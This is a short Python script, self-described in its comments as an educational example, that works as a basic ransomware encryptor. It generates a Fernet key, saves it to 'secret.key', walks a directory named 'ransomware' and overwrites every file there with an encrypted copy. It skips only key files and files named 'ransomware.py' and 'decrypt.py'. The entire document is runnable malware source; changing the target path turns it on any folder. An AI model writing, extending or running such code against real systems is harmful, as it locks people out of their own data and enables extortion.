from cryptography.fernet import Fernet
import os

# 1. Generate a cryptographic key and save it
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# 2. Load the saved key
def load_key():
    with open("secret.key", "rb") as key_file:
        return key_file.read()

# 3. Encrypt a file
def encrypt_file(file_path, key):
    cipher = Fernet(key)

    with open(file_path, "rb") as f:
        data = f.read()

    encrypted_data = cipher.encrypt(data)

    with open(file_path, "wb") as f:
        f.write(encrypted_data)

# 4. Find files to encrypt (example: inside "test_files" folder)
def find_files(directory):
    file_list = []

    for root, _, files in os.walk(directory):
        for name in files:
            path = os.path.join(root, name)

            # Ignore key file
            if not name.endswith(".key") and name not in ("ransomware.py", "decrypt.py"):
                file_list.append(path)

    return file_list

# 5. Main execution (educational example)
def main():
    generate_key()
    key = load_key()

    files = find_files("ransomware")

    for file_path in files:
        encrypt_file(file_path, key)

    print("Encryption completed successfully.")

if __name__ == "__main__":
    main()